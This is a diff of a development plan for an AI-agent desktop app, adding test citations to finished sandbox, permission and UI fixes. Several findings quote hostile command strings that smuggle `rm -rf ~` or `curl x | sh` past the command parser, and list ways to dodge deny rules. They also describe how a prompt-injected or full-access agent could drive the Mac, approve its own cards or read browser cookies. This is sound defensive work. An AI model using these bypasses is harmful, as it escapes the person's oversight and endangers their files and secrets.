       (1) a skill scanner (after QwenPaw's skill_scanner: prompt injection, exfiltration, credential access,
@@ -769,10 +903,15 @@ Open work, in the order it will be done:
       config.toml and Claude's disabled plugins marked off there), and imports through the skill installer: copied,
       scanned, recorded, renamed `name-codex` on a clash, an identical one skipped, blocked ones only with Import
       anyway, each off until switched on. Settings → Skills → Import, `myrmidon import-skills`.
+      (tests: `packages/runtime/tests/skill-scan.test.ts` — "each category has rules that find what they describe";
+      `packages/runtime/tests/skill-market.test.ts` — "the git catalogs list their skills with licenses, and one
+      installs through the scan and the review"; `packages/runtime/tests/skill-import.test.ts` — "imports copy in,
+      scanned and recorded, and stay off until the person switches them on")
 13. - [x] **Native UI phase 3+** — overlays, context menus, sheets, Settings as System Settings (spec
       2026-10-07-native-ui). Done 2026-10-09: sheets replace modals, context menus, ⌘K command menu, ⌘/ shortcuts,
       calm new chat, composer pop-ups, Settings like System Settings, old token names gone. Left: legacy.css clean-out,
       Reveal in Finder (needs the desktop shell).
+      (test: `apps/web/tests/sheet.test.tsx` — "Escape and ⌘. close the topmost sheet; a plain full stop does not")
 14. - [x] **Agents' browser and private addresses** — decide a rule (e.g. only ports the round opened) and DNS-pinned
       fetching in omp to close rebinding (69456b5 notes). **Decided 2026-10-09: only ports the run opened; DNS-pinned.**
       Done 2026-10-09 (web_fetch and the browser). Left: the shell can still reach private addresses (sandbox limits
@@ -782,6 +921,8 @@ Open work, in the order it will be done:
       fetched pinned, so they make no requests; only omp's own options, a timeout, nothing installed during a read;
       missing ones fall back and say what to install. Left: a reader that ignores its proxy, or a program yt-dlp
       starts itself (a JS runtime), would reach the network unchecked; lynx's -stdin path untested on a real lynx.
+      (test: `packages/runtime/tests/web.test.ts` — "DNS rebinding cannot reach a private address: the checked answer is
+      the one connected to")
 15. - [x] **Look over in the browser** — Settings → Plugins page and the rewind confirmation sheet. Done 2026-10-09
       on a throwaway project: Plugins renders (placeholder cut at narrow widths); rewind sheet, Rewind files, Undo rewind
       and the Git panel refresh all work. Found and fixed on the way: the folder picker let a slow home listing replace
@@ -951,11 +1092,16 @@ Earlier items:
       through) that expands to the change and opens the file; an allowed edit expands to what was allowed; Files
       lists "Changed in <project>"; a viewer opens a file as it is now (`GET /api/projects/:id/file`, contained to
       the folder, text only, 2 MB cap); a rewound run keeps View diff, with Open on each file.
+      (tests: `apps/web/tests/steps.test.ts` — "a file an agent edited or wrote shows as a step naming the file, with
+      what changed"; `apps/web/tests/server-project-file.test.ts` — "GET /api/projects/:id/file opens a file an agent
+      edited, and only files in that folder")
 - [x] **File browser like VS Code's Explorer** (the person's ask) — an Explorer view in project chats: the folder as
       a tree, one level loaded per folder opened (`GET /api/projects/:id/tree`), git status letters, folders with
       changes tinted, ignored entries dimmed, files the crew changed in this chat ringed, a name filter across the
       folder (`/find`, skipping what git ignores), arrow keys as in an editor, files open in the viewer. Refreshes on
       a rewind or commit and when the crew changes a file.
+      (test: `apps/web/tests/explorer.test.tsx` — "the Explorer opens folders by click and keys, finds files by name,
+      and opens a file in the viewer")
 
 ## Inspection of 68 commits (2026-10-09, evening)
 
@@ -968,17 +1114,34 @@ stay small so they merge cleanly into either.
 - [x] Sandboxed shells can `connect()` to the Cua Driver socket in the data folder (file-read deny does not cover
       sockets): a prompt-injected agent could run its own driver against it and drive the Mac with no app approval.
       Deny outbound unix sockets under the data folder (SBPL and bwrap).
+      (test: `packages/runtime/tests/sandbox.test.ts` — "a sandboxed command cannot connect to a socket in a hidden
+      folder or another run's /tmp/myr-*, only its own")
 - [x] Sandboxed commands likely inherit Myrmidon's Screen Recording / Accessibility grants (`screencapture`,
       CGEventPost): deny what the profile can (e.g. screencapture, osascript) or document the limit.
+      (test: `packages/runtime/tests/sandbox.test.ts` — "a sandboxed command cannot capture the screen or drive apps
+      with Myrmidon's privacy grants")
 - [x] Stop / Esc only stops rounds holding an app; one waiting for the app (or on its approval card) takes it after.
+      (test: `packages/runtime/tests/computer.test.ts` — "Stop also ends rounds waiting for an app or on its approval
+      card: they never take it after")
 - [x] Script Editor, Automator, Shortcuts (and Tor Browser) get full control with no warning: add them to the right
       tiers; cmd+R in a script app is a sensitive key.
+      (test: `packages/runtime/tests/computer-actions.test.ts` — "script apps are shell-like and Tor Browser view-only;
+      their run and send keys ask first")
 - [x] `type` with a newline bypasses the "Return sends" check; Mail's shift+cmd+D send is not a sensitive key.
+      (test: `packages/runtime/tests/computer-actions.test.ts` — "script apps are shell-like and Tor Browser view-only;
+      their run and send keys ask first")
 - [x] SANDBOX_SECRETS gaps once home reads are on: ~/.omp/agent, ~/.claude, ~/.codex, ~/.gemini, shell startup files,
       .terraform.d, .vault-token, .pgpass, .gem/credentials, .m2/settings.xml, Library/Containers and Group
       Containers; ~/.dotnet (a toolchain dir) holds a certificate store.
+      (tests: `packages/runtime/tests/read-access.test.ts` — "file tools refuse what the sandbox hides, open what the
+      person allowed, and reach anything with full access"; ".NET's certificate store stays hidden inside its readable
+      toolchain folder")
 - [x] Outside home, /Volumes, /Users/Shared, /private/var/folders and /tmp/myr-* stay readable.
+      (test: `packages/runtime/tests/sandbox.test.ts` — "outside the home, other disks, the shared folder, temp folders
+      and other runs' /tmp/myr-* stay unreadable")
 - [x] Unpinned fallback drivers (CUA_DRIVER_PATHS) run with the full environment and Myrmidon's grants.
+      (test: `packages/runtime/tests/computer.test.ts` — "a driver the person installed runs with a minimal environment,
+      and the log says it is their own")
 - [ ] [decide] Sandboxed binaries can probably use the Accessibility API under Myrmidon's grant (untestable here: no
       grant).
 - Sandboxed commands no longer reach the clipboard (pasteboard services denied): a project test that copies and
@@ -987,70 +1150,136 @@ stay small so they merge cleanly into either.
 ### B — Crew wind-down (`colony.ts`, `chat.ts`, `agent.ts`, `tools.ts` messaging, `tests/chat.test.ts`)
 - [x] A person's follow-up while a round settles goes into the closing round and can go unanswered ("Not sent: this
       conversation is closing", turn cut, completed). Their message must cancel settling (or start a new round).
+      (test: `packages/runtime/tests/crew-sync.test.ts` — "the person's follow-up while the crew winds down is answered,
+      and the round winds down again after")
 - [x] An answer given while settling skips the reviewer.
+      (test: `packages/runtime/tests/crew-sync.test.ts` — "a final answer given while the crew winds down is reviewed
+      like any other")
 - [x] A team lead's final answer in plain text never reaches the person: the round waits for the stall nudge (~10s,
       two extra model turns). Deliver it as in a solo round.
+      (test: `packages/runtime/tests/crew-sync.test.ts` — "a team lead's final answer in plain text reaches the person
+      without a stall nudge")
 - [x] Each sign-off sends one more model request that is then aborted (billed; aborted message in history).
+      (test: `packages/runtime/tests/crew-sync.test.ts` — "signing off asks the model nothing more: no request is sent
+      and then aborted")
 - [x] chat.test.ts: 78 pass / 10 fail (was 86 / 1): rounds wait SETTLE_QUIET_MS after the answer, tests never set
       quietMs, and rounds still settling crash after teardown (`this.store.home`, "no such colony").
 - [x] `create_group` sends without the one-last-word check; requeued non-mail notes lose `quiet` and their trigger.
+      (tests: `packages/runtime/tests/crew-sync.test.ts` — "a crewmate past its last word cannot start a group
+      conversation either"; `packages/runtime/tests/chat.test.ts` — "a note that reached an agent mid-turn and was cut
+      off with the turn opens its next turn as it was sent")
 - [x] The lead tells the person "This is a solo round" (brief wording leaking into replies).
-- [x] Misplaced JSDoc in prompts.ts (`missed` above `windDown`).
+      (test: `packages/runtime/tests/briefs.test.ts` — "a lead with no crewmates says plainly that the chat has none…")
+- [x] Misplaced JSDoc in prompts.ts (`missed` above `windDown`). unverified: comment fix; no check cited
 
 ### G — Dev servers (`tools.ts` start_server, `colony.ts` servers)
 - [x] colony.test "only ports a run's own servers opened … ports already in use cannot be claimed" fails on develop:
       a port already in use is claimed (`ok: true`).
 - [x] A server started under Full access keeps running unsandboxed after full access is taken back.
+      (test: `packages/runtime/tests/colony.test.ts` — "a server started under looser rules stops when the person takes
+      full access back, and its agent is told to start it again")
 
 ### C — Routes and project files (`devices.ts`, `projects.ts`, `server.ts` routes, `mcp.ts`, `ProjectExplorer.tsx`, `StepRow.tsx`)
 - [x] `GET /api/projects/:id/file|tree|find` are open to chats-only devices and `readProjectFile` ignores
       SANDBOX_SECRETS: a paired phone reads `.env` (or `~/.ssh/...` in a project at home). (My bug, from the file
       viewer.)
+      (tests: `apps/web/tests/server-project-file.test.ts` — "GET /api/projects/:id/file opens a file an agent edited,
+      and only files in that folder"; `packages/runtime/tests/projects.test.ts` — "a project around the person's home
+      hides their keys and Myrmidon's data, but not the project's own .env")
 - [x] `GET /api/computer` is open to chats-only devices and runs the driver, returning its path.
+      (test: `apps/web/tests/server-auth.test.ts` — "pairing: a single-use code makes a device with its own cookie and
+      scope; revoking it locks it out")
 - [x] Internal MCP name collisions: a server named `myrmidon_computer…` shadows or hides the driver's tools.
+      (test: `packages/runtime/tests/mcp.test.ts` — "names in Myrmidon's own namespace are refused, so no server hides
+      or stands in for the computer-use driver")
 - [x] Explorer: a subfolder that fails to load shows as empty; `toggle()` loads inside a state updater (twice in
       StrictMode).
+      (test: `apps/web/tests/explorer.test.tsx` — "a folder that fails to load says why and tries again; opening one
+      loads it once, even in StrictMode")
 - [x] Computer-use step screenshots all fetch up front (children of a closed <details> mount); a failed one pulses
       forever.
+      (test: `apps/web/tests/step-shot.test.tsx` — "a computer-use step fetches its screenshot only when opened, and
+      says so quietly when it can't")
 
 ### D — Setup assistant (`setup/Setup.tsx`, `setup/steps.tsx`, `setup/Nudge.tsx`, `runtime/src/setup.ts`, copy `setup`)
 - [x] Ready says "Set up" for every step only continued past (voice Off, no channel, alerts off, no model tested);
       "Here is what you set up" is untrue. Show what exists, and "Skipped" / "Not set up" otherwise.
+      (test: `apps/web/tests/setup-assistant.test.tsx` — "Ready says what exists: set up, set up later, skipped or not
+      set up, each row named by its words")
 - [x] Testing a model silently makes it the lead (and reviewer) for every new chat: say so, or apply on Continue.
+      (test: `apps/web/tests/setup-assistant.test.tsx` — "a model that answers is made the lead only on Continue, and
+      the step says so first")
 - [x] Mic test: leaving the step while the permission prompt is open leaks the microphone and its rAF loop; "Stop
       the test" leaves the UI in listening mode.
+      (tests: `apps/web/tests/setup-assistant.test.tsx` — "Stop the test lets the microphone go and puts the test back
+      to the start"; "a microphone allowed after the step was left is let go at once, and the step is not marked")
 - [x] Your first project cannot finish when a project exists (after refresh, or opened from Settings).
+      (test: `apps/web/tests/setup-assistant.test.tsx` — "the project step opened from Settings shows the project added
+      before and can be finished")
 - [x] The nudge's "Not now" hides it for good with no undo.
+      (test: `apps/web/tests/setup-assistant.test.tsx` — "the home screen card says what is left, and its close button
+      asks once before hiding it for good")
 - [x] Spend limit and reviewer sit on the project step (skipping it hides them); the default crew is all Opus with
       2 on demand and no cost hint.
+      (test: `apps/web/tests/setup-assistant.test.tsx` — "the spend limit, review and what the crew costs are on the
+      crew step, not the project step")
 - [x] Steps are vertically centred, so Back/Continue jump between steps.
+      (test: `apps/web/tests/setup-assistant.test.tsx` — "the content and the mascot are centred together across, right
+      of the step list, at one height on every step")
 - [x] Ready rows: accessible name ("Open You & mascot, done") does not contain the visible text (WCAG 2.5.3).
+      (test: `apps/web/tests/setup-assistant.test.tsx` — "Ready says what exists: set up, set up later, skipped or not
+      set up, each row named by its words")
 - [x] Single-step mode still lets the person wander to Ready; a failed mark is lost when a single step closes;
       'OK' hardcoded in steps.tsx.
+      (test: `apps/web/tests/setup-assistant.test.tsx` — "one step on its own keeps the list closed, and stays open when
+      its mark is not kept")
 
 ### E — Mascot (`Hero.tsx`, `HeroCrew.tsx`, `hero-crew.ts`, `MascotScreen.tsx`, `ui/pixel.tsx`, `ui/steering.ts`, `setup/SetupMascot.tsx`)
 - [x] ~6% of a core while the new-chat screen idles; the crew loop never pauses (window visible but unfocused, a
       sheet over it, narrow windows where the crew is hidden but still pokes the mascot).
+      (tests: `apps/web/tests/mascot-crew.test.tsx` — "the crew holds still while the window is in the background, and
+      moves again once it is back"; "the mascot is on stage only while it can be seen: no sheet over it, its window in
+      front")
 - [x] Scattering cursors overshoot their bounds by ~140px (scrollbars / clipping).
+      (test: `apps/web/tests/mascot-crew.test.tsx` — "scattering never carries a cursor out of its bounds")
 - [x] Heavy drop-shadow filter on the SVG redrawn ~13×/s while two crews run (fire backdrop) and while asleep.
+      unverified: no test or macOS-app check cited
 - [x] Keyboard activity never counts as presence (dozes while typing); a right-click breaks the next key press;
       `swallowClick` can eat the next real click after pointercancel; wander depends on the frame rate.
+      (tests: `apps/web/tests/mascot-crew.test.tsx` — "a right-click does not make the next key press a tap, and a
+      cancelled drag does not eat the next click"; `apps/web/tests/steering.test.ts` — "wander meanders as much at any
+      frame rate")
 - [x] The screen's caption and clock fail contrast (3.5:1); crew cursor names change on every load.
+      (test: `apps/web/tests/contrast.test.ts` — "the mascot screen's caption and readout read at 4.5:1 on the screen,
+      in both themes"); unverified: stable crew names no longer tested
 - [x] Impure render in useTypingColor; magic numbers outside ui-config.ts; dead `seek`/`ZERO`; crewTimers grows.
+      unverified: code tidy-up; no check cited
 
 ### F — Layout, Settings and copy (`App.tsx`, `Sidebar.tsx`, `Settings.tsx`, schedules UI, `ApprovalCards.tsx`, `copy.ts` outside setup)
 - [x] At narrow widths (~420px) neither the sidebar nor the setup step list collapses; content gets ~160px.
+      (tests: `apps/web/tests/sidebar-drawer.test.tsx` — "a narrow window keeps the sidebar off the page; ⌘B, the
+      toolbar and the palette slide it over"; `apps/web/tests/setup-assistant.test.tsx` — "the arrows move along the
+      step list, Left and Right as well as Up and Down for the strip a narrow window shows")
 - [x] Sidebar multi-select listbox breaks aria-required-children on every screen (buttons inside the listbox).
+      unverified: no test checks the listbox's children
 - [x] Schedule day chips: visible "Mon", name "Monday" (WCAG 2.5.3); Esc while editing closes Settings and loses
       the edit; the time field shows 12h while the line says 24h; monthly on the 29th–31st skips short months
       silently; the day shown uses the browser's zone while the server runs in its own.
+      (tests: `apps/web/tests/settings-schedules.test.tsx` — "a day chip is named by the day it shows…"; "Escape while
+      changing a schedule cancels the change and leaves Settings open"; "the time is picked in the same words the
+      sentence under it uses"; "a monthly schedule past the 28th says the short months are skipped…"; "times are said in
+      the zone Myrmidon runs schedules in…")
 - [x] Settings → Tools: one button's name does not contain its visible text.
+      unverified: no test or macOS-app check cited
 - [x] The read-in-this-chat approval path drops the typed note.
+      unverified: the test checks the call order, not the typed note
 - [x] Copy: computer use says "approve" (glossary: Allow); "Messaging apps" (glossary: channel); "Yes, turn it off"
       does not repeat its object; misplaced comment above `computerUse`. Full access says "approvals still apply" /
       "Rules set to ask still ask", but a full-access agent can read the server token and approve its own cards:
-      say what is true (and see [decide]).
+      say what is true (and see [decide]). unverified: no test or macOS-app check cited
 - [x] Channel tiles with letter placeholders (Slack "S", Teams "T", Tlon "~", Nostr "N").
+      (test: `apps/web/tests/contrast.test.ts` — "a channel tile without a brand mark reads as a monogram: one or two
+      white letters that stand out")
 
 ### H — Segmented controls (the person's screenshot)
 - [x] Dark mode: the selected segment was invisible (thumb #232328 on track #222228); labels wrapped and overlapped
@@ -1060,42 +1289,75 @@ stay small so they merge cleanly into either.
 ### I — Permission model (merge 98cfc6a), from hands-on testing; the code review adds to this
 - [x] An approval card's "More ways to allow → Everywhere" turns one approval into a rule for every chat in one click,
       with no confirmation (Full access as the default does confirm).
+      (test: `apps/web/tests/permissions-ui.test.tsx` — "an approval card answers once by default, and its menu
+      remembers the answer at the level chosen")
 - [x] Card copy: "Ask for this project asks before this." reads badly; the chat scope says "This chat — Until you
       remove it" (a chat-scoped choice reads as forever).
+      (test: `apps/web/tests/permissions-ui.test.tsx` — "an approval card answers once by default, and its menu
+      remembers the answer at the level chosen")
 - [x] Permissions → Who can use what: Computer use switches show on while computer use itself is off in Settings.
+      (test: `apps/web/tests/permissions-ui.test.tsx` — "while computer use is off, its switches are off and say where
+      to turn it on")
 - [x] Permissions → Check a tool lists raw tool ids (request_final_verification, mcp__stagehand_…): show names people
       know, grouped.
+      (test: `apps/web/tests/permissions-ui.test.tsx` — "the tools to check are listed by names people know, grouped,
+      with the id after")
 - [x] Label-in-name (WCAG 2.5.3): a button on the approval card, and the composer's "Send now" whose name is
       "Delivery: steer. Switch to queue".
+      (test: `apps/web/tests/permissions-ui.test.tsx` — "a card's buttons are named by the words they show (WCAG
+      2.5.3)")
 
 ### I2 — Permission engine, from its code review (agent I, branch fx-i-permissions)
 - [x] HIGH: `splitCommand` ignores backslash escapes: `echo \" ; rm -rf ~ ; echo \"` is one read-only `echo`
       segment (Ask allows it; a remembered `echo` rule allows it); `bun test \" && curl x | sh && \"` passes an allow
       for `bun test`. /bin/sh runs every part.
+      (test: `packages/protocol/tests/permissions.test.ts` — "an escaped quote opens no quotes: every part after it
+      runs")
 - [x] HIGH: the read-only project floor only denies kind 'edit'; `propose` (kind 'proposal', edits:true) matches an
       `edit *` allow anywhere and the server writes the file into the read-only project with no card.
+      (test: `packages/protocol/tests/permissions.test.ts` — "a proposed file always shows the person a card, even with
+      a global `edit *` allow")
 - [x] HIGH: since e4c6c6f a chats-only device can open ~/.ssh: `PUT /api/chats/:id/readable` is open to them and
       allowReadInChat now refuses only the data folder.
+      (test: `packages/runtime/tests/read-access.test.ts` — "a key folder opens for a chat only on the card of the
+      request asking for exactly it")
 - [x] Remembered rules are not checked against what the card offered (any rule, any scope the device may set;
       decision not tied to `approved`); chat scope is open to chats-only devices.
+      (test: `apps/web/tests/server-chat-permissions.test.ts` — "an approval remembers only what its card offered, tied
+      to the answer: the rule is saved, then the call decided")
 - [x] Offered prefixes are broader than the command shown (`rm -rf build` offers `rm`; `sudo …` offers `sudo`;
       `bash -c`/`python -c` offer the bare interpreter); rules beat the preset, so "allow rm everywhere" removes Auto's
       destructive ask for good.
+      (test: `packages/protocol/tests/permissions.test.ts` — "destructive, interpreter and escalation commands offer
+      themselves, or nothing")
 - [x] Channel "Always": remember → applyRules → redecideApprovals already approves, then decideApproval throws "no
       longer waiting" and the owner is told it failed; the label names the tool but saves the first offer.
+      (test: `packages/runtime/tests/channels.test.ts` — '"always" saves what its button names, and a step the saved
+      rule already approved counts as done')
 - [x] Deny rules are easy to dodge (`git -C . push`, `'git' push`, `\git push`, `sudo/command/timeout/env … git
       push`) and Auto's destructive detection misses `/bin/rm -rf`, `env -i rm`, `xargs rm`, `bash -c "rm…"`,
       `git checkout .`, `git branch -d`.
+      (tests: `packages/protocol/tests/permissions.test.ts` — "a deny on `git push` catches every way of writing it";
+      "Auto asks before destructive commands however they are written")
 - [x] Sensitive reads over channels: no key warning for the owner; "Always allow request_read" still offered.
+      (test: `packages/runtime/tests/channels.test.ts` — 'a request to read a key folder warns the owner and offers no
+      "always"')
 - [x] LOW: run_checks never asks (not GUARDED, kind 'other'); the approval route decides before saving the rule;
       `PUT /api/projects/:id/permissions` with `{preset}` and no `rules` is read as legacy and clears both; the
       access-changed notice tells agents to retry things the person declined.
+      (tests: `packages/runtime/tests/chat.test.ts` — "run_checks runs commands, so it asks under Ask like shell, and
+      runs nothing the person declines"; `apps/web/tests/server-full-access.test.ts` — "a project can be given full
+      access, and the project list says when the sandbox is off"; `packages/runtime/tests/full-access.test.ts` — "a
+      round after the person changed access opens by saying so…")
 
 ### K — Several terminals (the person's ask, with a screenshot of Claude Code's terminal panel)
 - [x] The workspace Terminal (the person's own shell) takes tabs like Claude Code's: "Terminal 1", "Terminal 2", each
       named by what runs in it (e.g. `bun run dev`), + to add, × to close (asking first if something still runs),
       kept alive while you switch views; a ⋯ menu for cursor style, blink, copy on select and scrollback; maximise
       the panel. Branch fx-k-terminals.
+      (tests: `apps/web/tests/terminal-panel.test.tsx` — "terminals open as tabs, each its own shell, kept alive and
+      named by what runs in it"; "the ⋯ menu sets cursor, blink, copy on select and scrollback for every terminal,
+      remembered here")
 
 ### L — A browser of your own, with tabs (the person's ask, with screenshots of Claude Code's browser pane)
 - [x] A Browser view in the workspace like Claude Code's: tabs with favicon and title, + for a new tab, × to close,
@@ -1105,25 +1367,35 @@ stay small so they merge cleanly into either.
       Clear browsing data (confirmed). Built on the Chrome Myrmidon already runs for agents (CDP screencast and input,
       as the Computer view does), in the person's own browser context, never shared with agents unless handed over.
       Branch fx-l-browser.
+      (tests: `apps/web/tests/browser-view.test.tsx` — "the tab strip shows each tab, opens and closes them, and streams
+      the one picked"; "the ⋯ menu changes the viewport and cookies, keeps allowed sites, and asks before clearing")
 
 ### Left after the fixes (2026-10-10)
 - [x] Flaky under full-suite load (passes alone 3/3) (done: a real bug, the refusal now records where navigation started): person-browser "a page that opens a local address itself…".
 - [x] On develop itself: apps/web/tests/mascot-settings.test.tsx "the screen is drawn as set…" fails (eyes not in the
       theme accent) — not from these fixes. Fixed ee3265a: at night the resting mood has its own eye colour; the test pins midday.
 - [x] (done) A rare double review: requestFinalVerification sets _finalRunning only after awaiting the worktree merge.
+      (test: `packages/runtime/tests/colony.test.ts` — "two reviews asked for at the same moment start only one")
 - [x] (done: 2 High findings fixed; docs/research/2026-10-10-command-parser-probe.md) An independent, adversarial probe of the command parser after its second round of fixes (I2): the reviewer was
       stopped before probing; the fix agent re-ran the earlier probes (all now ask or are denied). Run
       scratchpad review-i/p1–p4 style probes again before relying on Ask for untrusted repos.
+      (test: `packages/protocol/tests/permissions.test.ts` — "a here-string or input redirect into an interpreter is
+      code, not a filename argument")
 - [x] (done) A stopped round's computer-use approval card stays up until it times out (Stop should cancel pending computer
       approvals in colony.ts).
+      (test: `packages/runtime/tests/computer.test.ts` — "the person's Stop takes down the round's waiting computer card
+      at once; the round goes on")
 - [ ] Browser view follow-ups: pick element, auto-verify changes, split layout, handing a tab to an agent (with a
       site list for that), downloads (denied now), LAN hosts in Allowed sites.
 - [x] Terminals end on page reload (by design for now); no close-all; a label can show an option's value as the
       argument (`vim -u NONE x` → `vim NONE`). Close all is in the ⋯ menu (asks while a command runs); labels skip
       known options' values (`vim x`), inline code (`python3 -c …` → `python3`) and what follows a secret-named option.
+      (tests: `apps/web/tests/terminal-panel.test.tsx` — "the ⋯ menu closes every terminal at once, asking first while a
+      command runs in any"; `apps/web/tests/terminal-foreground.test.ts` — "an option's value is not taken for the
+      argument the tab names")
 - [x] The sandbox now hides the clipboard: a project test that copies and pastes fails inside the sandbox (stated
       in a code comment; say it in the docs). Said in the README's "Safe by default" and the Permissions page's
-      sandbox note (macOS only: bubblewrap leaves the clipboard alone).
+      sandbox note (macOS only: bubblewrap leaves the clipboard alone). unverified: docs and copy only; no check cited
 ### [decide]
 - [ ] Linux: sandboxed agents can still reach the managed Chrome's DevTools port (bwrap cannot block one port), so
       they could read the person's browser cookies there (gap `devtoolsPortOnLinux`, docs/ci.md). A network
